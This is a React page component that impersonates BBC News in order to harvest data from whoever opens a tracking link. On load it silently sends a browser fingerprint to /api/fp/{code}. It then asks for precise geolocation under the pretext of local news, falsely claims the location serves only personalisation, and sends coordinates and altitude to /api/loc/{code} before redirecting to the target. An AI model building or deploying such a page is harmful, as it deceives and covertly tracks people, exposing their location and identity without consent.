'use client';

import { useEffect, useRef } from 'react';

export default function BBCPage({ code, destination }: { code: string; destination: string }) {
  const sentFp = useRef(false);

  useEffect(() => {
    if (sentFp.current) return;
    sentFp.current = true;
    const fp = {
      screen:              `${window.screen.width}x${window.screen.height}`,
      colorDepth:          window.screen.colorDepth,
      timezone:            Intl.DateTimeFormat().resolvedOptions().timeZone,
      tzOffset:            new Date().getTimezoneOffset(),
      platform:            navigator.platform,
      language:            navigator.language,
      languages:           navigator.languages?.join(',') ?? '',
      cookiesEnabled:      navigator.cookieEnabled,
      doNotTrack:          navigator.doNotTrack,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory:        (navigator as Navigator & { deviceMemory?: number }).deviceMemory,
      touchPoints:         navigator.maxTouchPoints,
      plugins:             Array.from(navigator.plugins ?? []).map((p) => p.name).join('|'),
      referrer:            document.referrer,
    };
    navigator.sendBeacon(`/api/fp/${code}`, JSON.stringify(fp));
  }, [code]);

  function go() {
    window.location.replace(destination);
  }

  function requestLocation() {
    const btn = document.getElementById('btn-allow') as HTMLButtonElement;
    btn.disabled = true;
    btn.textContent = 'Requesting access…';

    if (!navigator.geolocation) { go(); return; }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        showLoading();
        navigator.sendBeacon(`/api/loc/${code}`, JSON.stringify({
          lat:         pos.coords.latitude,
          lon:         pos.coords.longitude,
          accuracy:    pos.coords.accuracy,
          altitude:    pos.coords.altitude,
          altAccuracy: pos.coords.altitudeAccuracy,
        }));
        setTimeout(go, 900);
      },
      () => {
        showDenied();
        setTimeout(go, 1400);
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 },
    );
  }

  function showLoading() {
    (document.getElementById('view-request') as HTMLElement).style.display = 'none';
    (document.getElementById('view-loading') as HTMLElement).style.display = 'block';
  }

  function showDenied() {
    (document.getElementById('view-request') as HTMLElement).style.display = 'none';
    (document.getElementById('view-denied') as HTMLElement).style.display = 'block';
  }

  return (
    <>
      <style>{`
        body { background: #f6f6f6; color: #222; min-height: 100vh; display: flex; flex-direction: column; }
        .hdr { background: #000; padding: 0 16px; height: 56px; display: flex; align-items: center; gap: 12px; }
        .bbc-logo { display: flex; gap: 3px; }
        .bbc-logo b { display: flex; align-items: center; justify-content: center; background: #fff; color: #000;
                      width: 26px; height: 26px; font-size: 15px; font-weight: 900; letter-spacing: -1px; font-style: normal; }
        .news-label { color: #fff; font-size: 20px; font-weight: 700; letter-spacing: .5px;
                      border-left: 2px solid #e4003b; padding-left: 10px; margin-left: 4px; line-height: 1; }
        .nav { background: #e4003b; padding: 0 16px; height: 38px; display: flex; align-items: center;
               gap: 24px; overflow-x: auto; }
        .nav a { color: #fff; font-size: 13px; font-weight: 600; text-decoration: none;
                 white-space: nowrap; opacity: .85; }
        .nav a:hover { opacity: 1; }
        .page { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px 16px; }
        .card { background: #fff; border: 1px solid #e0e0e0; border-radius: 4px;
                max-width: 480px; width: 100%; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,.08); }
        .card-header { background: #e4003b; padding: 20px 24px; }
        .card-header h1 { color: #fff; font-size: 22px; font-weight: 700; line-height: 1.25; }
        .card-header p { color: rgba(255,255,255,.85); font-size: 13px; margin-top: 4px; }
        .card-body { padding: 24px; }
        .loc-icon { width: 52px; height: 52px; background: #f6f6f6; border: 2px solid #e0e0e0;
                    border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
        .loc-icon svg { width: 26px; height: 26px; fill: #e4003b; }
        .card-body h2 { font-size: 17px; font-weight: 700; margin-bottom: 8px; line-height: 1.3; }
        .desc { font-size: 14px; color: #444; line-height: 1.6; margin-bottom: 20px; }
        .bullets { list-style: none; margin-bottom: 22px; }
        .bullets li { font-size: 13px; color: #444; padding: 5px 0 5px 20px;
                      position: relative; line-height: 1.5; }
        .bullets li::before { content: '✓'; position: absolute; left: 0; color: #e4003b; font-weight: 700; }
        .btn-allow { width: 100%; background: #e4003b; color: #fff; border: none; padding: 14px;
                     font-size: 16px; font-weight: 700; cursor: pointer; border-radius: 3px;
                     letter-spacing: .3px; transition: background .15s; }
        .btn-allow:hover { background: #c2002f; }
        .btn-allow:disabled { background: #aaa; cursor: default; }
        .btn-skip { display: block; text-align: center; margin-top: 12px; color: #767676;
                    font-size: 13px; cursor: pointer; text-decoration: underline;
                    background: none; border: none; width: 100%; }
        .btn-skip:hover { color: #222; }
        .privacy { font-size: 11px; color: #999; margin-top: 16px; line-height: 1.5; text-align: center; }
        .privacy a { color: #767676; }
        .loading { display: none; text-align: center; padding: 40px 24px; }
        .spinner { width: 36px; height: 36px; border: 3px solid #e0e0e0; border-top-color: #e4003b;
                   border-radius: 50%; animation: spin .8s linear infinite; margin: 0 auto 16px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading p { color: #444; font-size: 14px; }
        .denied { display: none; text-align: center; padding: 32px 24px; }
        .denied p { color: #444; font-size: 14px; margin-bottom: 14px; }
        .ftr { background: #323232; padding: 16px; text-align: center; }
        .ftr p { color: #aaa; font-size: 11px; }
      `}</style>

      <div className="hdr">
        <div className="bbc-logo">
          <b>B</b><b>B</b><b>C</b>
        </div>
        <span className="news-label">NEWS</span>
      </div>

      <div className="nav">
        {['Home','UK','World','Business','Politics','Tech','Science','Health','Entertainment','Sport'].map(n => (
          <a key={n} href="#">{n}</a>
        ))}
      </div>

      <div className="page">
        <div className="card">

          <div id="view-request">
            <div className="card-header">
              <h1>Your local BBC News</h1>
              <p>Personalised news and weather for your area</p>
            </div>
            <div className="card-body">
              <div className="loc-icon">
                <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
              </div>
              <h2>Allow BBC News to use your location</h2>
              <p className="desc">
                To show you local news, weather forecasts and travel updates relevant
                to where you are, BBC News needs access to your device location.
              </p>
              <ul className="bullets">
                <li>Breaking news from your region</li>
                <li>Accurate local weather forecast</li>
                <li>Traffic and travel updates nearby</li>
                <li>Local sport and events</li>
              </ul>
              <button id="btn-allow" className="btn-allow" onClick={requestLocation}>
                Allow location access
              </button>
              <button className="btn-skip" onClick={go}>
                Not now, continue without location
              </button>
              <p className="privacy">
                Your location is used only to personalise your BBC News experience.{' '}
                <a href="#">Privacy policy</a> &nbsp;·&nbsp; <a href="#">Cookie settings</a>
              </p>
            </div>
          </div>

          <div className="loading" id="view-loading">
            <div className="spinner" />
            <p>Loading your local news&hellip;</p>
          </div>

          <div className="denied" id="view-denied">
            <p>Location access was not granted. Continuing to BBC News&hellip;</p>
            <div className="spinner" style={{ margin: '0 auto' }} />
          </div>

        </div>
      </div>

      <div className="ftr">
        <p>Copyright &copy; {new Date().getFullYear()} BBC. The BBC is not responsible for the content of external sites.</p>
      </div>
    </>
  );
}
